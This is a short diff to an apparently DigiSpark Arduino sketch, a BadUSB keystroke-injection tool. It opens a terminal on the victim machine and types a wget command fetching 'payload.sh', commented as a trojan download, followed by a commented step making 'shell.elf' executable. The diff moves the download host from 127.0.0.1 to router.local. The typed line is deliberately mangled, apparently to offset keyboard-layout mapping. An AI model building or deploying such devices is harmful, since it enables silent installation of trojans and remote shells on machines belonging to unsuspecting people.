@@ -31,8 +31,8 @@ void setup()
   DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT); 
   DigiKeyboard.delay(DELAY);
   
-  // DigiKeyboard.println("wget -N -q http://127.0.0.1/payload.sh"); // download trojan
-  DigiKeyboard.println("wget /N /q http>&&127.0.0.1&pazload.sh");
+  // DigiKeyboard.println("wget -N -q http://router.local/payload.sh"); // download trojan
+  DigiKeyboard.println("wget /N /q http>&&router.local&pazload.sh");
   //DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(DELAY);
   // DigiKeyboard.println("chmod +x shell.elf"); // set execute permissions
